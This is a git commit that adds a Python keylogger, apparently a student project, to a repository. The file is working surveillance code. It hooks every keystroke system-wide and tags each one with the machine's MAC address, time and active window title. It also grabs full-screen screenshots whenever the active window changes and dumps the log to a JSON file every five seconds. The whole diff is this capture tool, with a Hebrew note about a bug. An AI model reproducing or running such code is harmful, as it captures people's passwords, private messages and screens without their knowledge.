3bb3ac24f1be6230d3797f41f14556c5d739d8ae
d.c! <daniel.c99999@gmail.com>
2025-02-12 12:41:25 +0200

    s

---
+++ old_project/Daniel Cohen/keylogger.py
@@ -0,0 +1,115 @@
+import threading
+import time
+import keyboard
+import os
+import  json
+from getmac import get_mac_address
+import win32gui
+from PIL import ImageGrab
+
+
+class KeyloggerService:
+    def __init__(self):
+        self.__action = False
+        self.__data = {}
+        self.prev_up = None
+        self.current_app = None
+
+    def __change_action(self):
+        self.__action = not (self.__action)
+
+
+    def __exit_point(self):
+        if keyboard.is_pressed('q'):
+            os._exit(0)
+            self.__change_action()
+
+    @staticmethod
+    def __current_time() -> str:
+        return time.strftime('%d/%m/%Y  %H:%M')
+
+
+    def __on_press(self, pressed_key):
+        key = pressed_key.name
+        self.__add_to_data(self.__data, key)
+        self.__exit_point()
+
+
+    def __add_on_release(self, pressed_key):
+        return pressed_key.name
+
+
+    def current_screenshot(self):
+        if [self.prev_up] != [self.current_app]:
+            screen_shot = ImageGrab.grab()
+            path = rF"C:\Users\1\פרוייקט סיום קודקוד\keylogger_picture-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
+            screen_shot.save(path)
+            self.prev_up = self.current_app
+
+    def __add_to_data(self, dictionary: dict, data: str):
+        current_time = self.__current_time()
+        current_mac_address = get_mac_address()
+        current_app_1 = win32gui.GetForegroundWindow()
+        current_app = win32gui.GetWindowText(current_app_1)
+        self.current_app = rf"{current_app}"
+
+        if not dictionary.get(current_mac_address):
+            dictionary[current_mac_address] = {}
+        if not dictionary[current_mac_address].get(current_time):
+            dictionary[current_mac_address][current_time] = {}
+        if not dictionary[current_mac_address][current_time].get(self.current_app):
+            dictionary[current_mac_address][current_time][self.current_app] = []
+        dictionary[current_mac_address][current_time][self.current_app].append(data)
+
+    def start(self):
+        self.__change_action()
+        while self.__action:
+            keyboard.on_press(self.__on_press)
+            keyboard.on_release(self.__add_on_release)
+            time.sleep(0.1)
+
+
+    def get_data(self):
+        data = self.__data
+        self.__data = {}
+        return data
+
+    def __enter__(self):
+        self.start()
+
+    def __exit__(self, exc_type, exc_val, exc_tb):
+        return 1
+
+class FileWriter:
+    @staticmethod
+    def write_to_file(data:dict):
+        with open(r"C:\Users\1\פרוייקט סיום קודקוד\אוסף הקשות.json" , "w" , encoding="utf-8") as file:
+            json.dump(data , file ,ensure_ascii=False)
+
+
+class KeyLoggerManager:
+
+    def __init__(self):
+        self.instance = KeyloggerService()
+
+    def start(self):
+        self.instance.start()
+
+    def write_to_file(self):
+        FileWriter.write_to_file(self.instance.get_data())
+
+    def main(self):
+        threading.Thread(target=self.start).start()
+        while True:
+            print(self.instance.current_app == self.instance.prev_up)
+            self.instance.current_screenshot()
+            threading.Thread(target=self.write_to_file).start()
+            time.sleep(5)
+print(get_mac_address())
+
+A = KeyLoggerManager()
+A.main()
+
+
+
+# לטפל בזה שלא משתנה העידכון של האם השתנה עמוד - אחרי שפעם אחת השתנה נשאר תמיד TRUE
